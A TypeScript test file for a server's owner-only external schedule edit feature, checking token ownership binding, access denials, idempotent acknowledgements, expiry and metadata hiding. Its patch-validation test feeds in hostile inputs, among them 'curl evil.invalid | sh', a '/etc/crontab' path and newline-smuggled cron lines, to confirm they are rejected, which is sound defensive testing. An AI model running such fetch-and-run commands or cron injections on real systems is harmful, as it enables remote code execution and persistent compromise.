import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { addNetworkMember, createNetworkTokenForNode, register } from "./auth.js";
import { db } from "./db.js";
import { upsertNodeWithSec1Guard } from "./tools.js";

const dir = mkdtempSync(join(tmpdir(), "anet-external-schedule-edits-"));
if (!process.env.COMMHUB_DB) throw new Error("test688 requires COMMHUB_DB before module import");

const stamp = `${process.pid}_${Date.now()}`;
const nodeId = `n_b4_${stamp}`;
const alias = `b4-node-${stamp}`;
const scheduleId = "managed-news-pull";
let server: any;
let base = "";
let networkId = "";
let adminToken = "";
let ownerToken = "";
let memberToken = "";
let nodeToken = "";
let foreignNodeToken = "";
let nodeTokenId = "";
let ownerId = "";
let memberId = "";

async function api(token: string, path: string, init?: RequestInit) {
  const response = await fetch(`${base}${path}`, {
    ...init,
    headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json", ...(init?.headers || {}) },
  });
  return { status: response.status, body: await response.json() as any };
}

function snapshot(revision: number, extra: Record<string, unknown> = {}) {
  return JSON.stringify({
    observed_at: new Date().toISOString(),
    schedules: [{
      id: scheduleId,
      name: "Pull X news",
      kind: "cron",
      frequency: "0 */6 * * *",
      status: "active",
      enabled: true,
      editable: true,
      revision,
      log_ref: "grok-news.log",
      ...extra,
    }],
  });
}

beforeAll(async () => {
  const admin = register(`b4_admin_${stamp}`, "B4Admin123!", undefined, "B4 Admin");
  const owner = register(`b4_owner_${stamp}`, "B4Owner123!", undefined, "B4 Owner");
  const member = register(`b4_member_${stamp}`, "B4Member123!", undefined, "B4 Member");
  expect(admin.ok && owner.ok && member.ok).toBe(true);
  adminToken = admin.token!;
  ownerToken = owner.token!;
  memberToken = member.token!;
  networkId = admin.network_id!;
  const adminId = admin.user!.user_id;
  ownerId = owner.user!.user_id;
  memberId = member.user!.user_id;
  expect(addNetworkMember(networkId, ownerId, "member", adminId).ok).toBe(true);
  expect(addNetworkMember(networkId, memberId, "member", adminId).ok).toBe(true);

  const minted = createNetworkTokenForNode(ownerId, networkId, alias, nodeId);
  expect(minted.ok).toBe(true);
  nodeToken = minted.token!;
  nodeTokenId = minted.token_id!;
  const foreign = createNetworkTokenForNode(memberId, networkId, `foreign-${alias}`, `n_foreign_${stamp}`);
  expect(foreign.ok).toBe(true);
  foreignNodeToken = foreign.token!;

  db.run(
    `INSERT INTO sessions (resume_id, alias, status, node_id, network_id, external_schedules, updated_at)
     VALUES (?1, ?2, 'idle', ?3, ?4, ?5, datetime('now'))`,
    [`r_b4_${stamp}`, alias, nodeId, networkId, snapshot(7)],
  );

  const mod: any = await import("./server.js");
  server = mod.bootServer({ port: 0, hostname: "127.0.0.1" });
  base = `http://127.0.0.1:${server.port}`;
});

afterAll(() => {
  try { server?.stop?.(true); } catch {}
  try { rmSync(dir, { recursive: true, force: true }); } catch {}
});

describe("RFC-036 exact-owner external schedule edit intents", () => {
  test("ownership is pinned at node-token mint and cannot be stolen", () => {
    const node = db.get<any>("SELECT owner_user_id, network_id FROM nodes WHERE node_id = ?1", nodeId)!;
    expect(node.owner_user_id).toBe(ownerId);
    expect(node.network_id).toBe(networkId);
    const ownerAudit = db.get<any>("SELECT detail FROM audit_log WHERE action = 'external_schedule.owner_claimed' AND target_id = ?1", nodeId)!;
    expect(ownerAudit).toBeTruthy();
    expect(JSON.parse(ownerAudit.detail)).toEqual({ node_id: nodeId, network_id: networkId });
    const theft = createNetworkTokenForNode(memberId, networkId, alias, nodeId);
    expect(theft).toEqual({ ok: false, error: "node_owner_mismatch" });

    const legacy = createNetworkTokenForNode(ownerId, networkId, `${alias}-legacy`);
    expect(legacy.ok).toBe(true);
    expect(db.get<any>("SELECT bound_node_id FROM api_tokens WHERE token_id = ?1", legacy.token_id!)!.bound_node_id).toBeNull();
  });

  test("the real node-token HTTP endpoint requires and persists the immutable node binding", async () => {
    const httpNodeId = `n_b4_http_${stamp}`;
    const minted = await api(ownerToken, "/api/auth/node-token", {
      method: "POST",
      body: JSON.stringify({ network_id: networkId, node_name: `${alias}-http`, node_id: httpNodeId }),
    });
    expect(minted.status).toBe(200);
    expect(minted.body.node_id).toBe(httpNodeId);
    expect(db.get<any>("SELECT owner_user_id FROM nodes WHERE node_id = ?1", httpNodeId)!.owner_user_id).toBe(ownerId);
    const resolved = db.get<any>("SELECT bound_node_id FROM api_tokens WHERE token_id = ?1", minted.body.token_id)!;
    expect(resolved.bound_node_id).toBe(httpNodeId);
  });

  test("report_status verifies an owner binding but never first-claims a legacy node", () => {
    expect(upsertNodeWithSec1Guard({
      node_id: nodeId,
      callerNetworkId: networkId,
      callerUserId: ownerId,
      callerTokenId: nodeTokenId,
      alias,
      runtime: "codex-app-server",
    }).result).toBe("updated");
    const wrongOwner = upsertNodeWithSec1Guard({
      node_id: nodeId,
      callerNetworkId: networkId,
      callerUserId: memberId,
      callerTokenId: nodeTokenId,
      alias,
    });
    expect(wrongOwner).toMatchObject({ result: "refused", reason: "owner_mismatch" });

    const legacyNodeId = `n_b4_legacy_${stamp}`;
    db.run(
      "INSERT INTO nodes (node_id, node_name, alias, network_id) VALUES (?1, ?2, ?2, ?3)",
      [legacyNodeId, `${alias}-legacy`, networkId],
    );
    expect(upsertNodeWithSec1Guard({
      node_id: legacyNodeId,
      callerNetworkId: networkId,
      callerUserId: ownerId,
      alias: `${alias}-legacy`,
      runtime: "claude-code-cli",
    }).result).toBe("updated");
    expect(db.get<any>("SELECT owner_user_id FROM nodes WHERE node_id = ?1", legacyNodeId)!.owner_user_id).toBeNull();
    const legacyClaim = createNetworkTokenForNode(ownerId, networkId, `${alias}-legacy`, legacyNodeId);
    expect(legacyClaim).toEqual({ ok: false, error: "node_owner_unclaimed" });
    expect(db.get<any>("SELECT owner_user_id FROM nodes WHERE node_id = ?1", legacyNodeId)!.owner_user_id).toBeNull();
  });

  test("network admin, member, node token, and unknown authority fields cannot create an intent", async () => {
    const request = {
      network_id: networkId,
      schedule_id: scheduleId,
      base_revision: 7,
      patch: { enabled: false },
    };
    for (const token of [adminToken, memberToken, nodeToken]) {
      const denied = await api(token, `/api/nodes/${nodeId}/external-schedule-edits`, { method: "POST", body: JSON.stringify(request) });
      expect(denied.status).toBe(403);
    }
    const forged = await api(ownerToken, `/api/nodes/${nodeId}/external-schedule-edits`, {
      method: "POST",
      body: JSON.stringify({ ...request, owner_user_id: ownerId }),
    });
    expect(forged.status).toBe(400);
    expect(forged.body.error).toBe("invalid_request");
    expect(db.get<any>("SELECT COUNT(*) AS count FROM external_schedule_edits")!.count).toBe(0);
    expect(db.get<any>("SELECT COUNT(*) AS count FROM audit_log WHERE action = 'external_schedule.edit_requested'")!.count).toBe(0);
  });

  test("structured patch rejects command, paths, aliases, malformed cron, and empty edits before write", async () => {
    const invalidPatches = [
      { command: "curl evil.invalid | sh" },
      { path: "/etc/crontab" },
      { env: { SECRET: "value" } },
      { cron: "@reboot" },
      { cron: "0 0 * * * root" },
      { cron: "0 0 * * *\n* * * * *" },
      { cron: "61 0 * * *" },
      {},
    ];
    for (const patch of invalidPatches) {
      const denied = await api(ownerToken, `/api/nodes/${nodeId}/external-schedule-edits`, {
        method: "POST",
        body: JSON.stringify({ network_id: networkId, schedule_id: scheduleId, base_revision: 7, patch }),
      });
      expect(denied.status).toBe(400);
    }
    expect(db.get<any>("SELECT COUNT(*) AS count FROM external_schedule_edits")!.count).toBe(0);
  });

  test("concurrent owner requests create exactly one opaque pending intent", async () => {
    const request = {
      method: "POST",
      body: JSON.stringify({
        network_id: networkId,
        schedule_id: scheduleId,
        base_revision: 7,
        patch: { cron: "0 */12 * * *", enabled: true },
      }),
    };
    const responses = await Promise.all([
      api(ownerToken, `/api/nodes/${nodeId}/external-schedule-edits`, request),
      api(ownerToken, `/api/nodes/${nodeId}/external-schedule-edits`, request),
    ]);
    expect(responses.map((value) => value.status).sort()).toEqual([202, 409]);
    const accepted = responses.find((value) => value.status === 202)!;
    expect(accepted.body.intent.intent_id).toMatch(/^sei_[0-9a-f-]+$/);
    expect(accepted.body.intent.patch).toEqual({ enabled: true, cron: "0 */12 * * *" });
    expect(accepted.body.intent.created_by_user).toBeUndefined();
    expect(accepted.body.intent.created_by_token).toBeUndefined();
    expect(db.get<any>("SELECT COUNT(*) AS count FROM external_schedule_edits")!.count).toBe(1);

    const audit = db.get<any>("SELECT detail FROM audit_log WHERE action = 'external_schedule.edit_requested'")!;
    expect(audit).toBeTruthy();
    expect(audit.detail).not.toContain("curl");
    expect(audit.detail).not.toContain("/etc/");
    expect(audit.detail).not.toContain("utok_");
    expect(JSON.parse(audit.detail).fields).toEqual(["cron", "enabled"]);
  });

  test("only the exact bound node token can claim; lost-response pull and terminal ack are idempotent", async () => {
    const foreign = await api(foreignNodeToken, `/api/nodes/${nodeId}/external-schedule-edits/pending`);
    expect(foreign.status).toBe(403);
    expect(foreign.body.error).toBe("node_token_binding_required");

    const first = await api(nodeToken, `/api/nodes/${nodeId}/external-schedule-edits/pending`);
    expect(first.status).toBe(200);
    expect(first.body.intent.status).toBe("delivered");
    const intentId = first.body.intent.intent_id;
    const repeated = await api(nodeToken, `/api/nodes/${nodeId}/external-schedule-edits/pending`);
    expect(repeated.body.intent.intent_id).toBe(intentId);

    const wrongRevision = await api(nodeToken, `/api/nodes/${nodeId}/external-schedule-edits/${intentId}/ack`, {
      method: "POST", body: JSON.stringify({ status: "applied", result_revision: 99 }),
    });
    expect(wrongRevision.status).toBe(409);
    expect(wrongRevision.body.error).toBe("invalid_result_revision");

    const applied = await api(nodeToken, `/api/nodes/${nodeId}/external-schedule-edits/${intentId}/ack`, {
      method: "POST", body: JSON.stringify({ status: "applied", result_revision: 8 }),
    });
    expect(applied.status).toBe(200);
    expect(applied.body.intent.status).toBe("applied");
    const retried = await api(nodeToken, `/api/nodes/${nodeId}/external-schedule-edits/${intentId}/ack`, {
      method: "POST", body: JSON.stringify({ status: "applied", result_revision: 8 }),
    });
    expect(retried.status).toBe(200);
    expect(retried.body.idempotent).toBe(true);
    const contradictory = await api(nodeToken, `/api/nodes/${nodeId}/external-schedule-edits/${intentId}/ack`, {
      method: "POST", body: JSON.stringify({ status: "rejected", error_code: "local_apply_failed" }),
    });
    expect(contradictory.status).toBe(409);
    expect(contradictory.body.error).toBe("intent_already_terminal");
    expect(db.get<any>("SELECT COUNT(*) AS count FROM audit_log WHERE action = 'external_schedule.edit_applied'")!.count).toBe(1);
  });

  test("a delivered intent expires with its TTL and cannot permanently wedge single-flight", async () => {
    db.run("UPDATE sessions SET external_schedules = ?1, updated_at = datetime('now', '+1 second') WHERE node_id = ?2", [snapshot(8), nodeId]);
    const created = await api(ownerToken, `/api/nodes/${nodeId}/external-schedule-edits`, {
      method: "POST",
      body: JSON.stringify({ network_id: networkId, schedule_id: scheduleId, base_revision: 8, patch: { enabled: false } }),
    });
    expect(created.status).toBe(202);
    const claimed = await api(nodeToken, `/api/nodes/${nodeId}/external-schedule-edits/pending`);
    expect(claimed.body.intent.intent_id).toBe(created.body.intent.intent_id);
    db.run("UPDATE external_schedule_edits SET expires_at = ?1 WHERE intent_id = ?2", [Date.now() - 1, created.body.intent.intent_id]);
    const afterExpiry = await api(nodeToken, `/api/nodes/${nodeId}/external-schedule-edits/pending`);
    expect(afterExpiry.body.intent).toBeNull();
    expect(db.get<any>("SELECT status FROM external_schedule_edits WHERE intent_id = ?1", created.body.intent.intent_id)!.status).toBe("expired");

    const replacement = await api(ownerToken, `/api/nodes/${nodeId}/external-schedule-edits`, {
      method: "POST",
      body: JSON.stringify({ network_id: networkId, schedule_id: scheduleId, base_revision: 8, patch: { enabled: false } }),
    });
    expect(replacement.status).toBe(202);
    db.run("DELETE FROM external_schedule_edits WHERE intent_id IN (?1, ?2)", [created.body.intent.intent_id, replacement.body.intent.intent_id]);
  });

  test("stale snapshot revision and read-only schedules fail closed without creating intent", async () => {
    db.run("UPDATE sessions SET external_schedules = ?1, updated_at = datetime('now', '+1 second') WHERE node_id = ?2", [snapshot(8), nodeId]);
    const stale = await api(ownerToken, `/api/nodes/${nodeId}/external-schedule-edits`, {
      method: "POST",
      body: JSON.stringify({ network_id: networkId, schedule_id: scheduleId, base_revision: 7, patch: { enabled: false } }),
    });
    expect(stale.status).toBe(409);
    expect(stale.body.error).toBe("revision_conflict");

    db.run("UPDATE sessions SET external_schedules = ?1, updated_at = datetime('now', '+2 second') WHERE node_id = ?2", [snapshot(8, { editable: false }), nodeId]);
    const readOnly = await api(ownerToken, `/api/nodes/${nodeId}/external-schedule-edits`, {
      method: "POST",
      body: JSON.stringify({ network_id: networkId, schedule_id: scheduleId, base_revision: 8, patch: { enabled: false } }),
    });
    expect(readOnly.status).toBe(409);
    expect(readOnly.body.error).toBe("schedule_read_only");
    expect(db.get<any>("SELECT COUNT(*) AS count FROM external_schedule_edits")!.count).toBe(1);
  });

  test("owner history exposes no identity, token, network, or command metadata", async () => {
    const listed = await api(ownerToken, `/api/nodes/${nodeId}/external-schedule-edits?network_id=${encodeURIComponent(networkId)}`);
    expect(listed.status).toBe(200);
    expect(listed.body.edits).toHaveLength(1);
    const serialized = JSON.stringify(listed.body);
    for (const secretField of ["created_by_user", "created_by_token", "consumed_by_token", "network_id", "command", "path", "env"]) {
      expect(serialized).not.toContain(secretField);
    }
  });
});
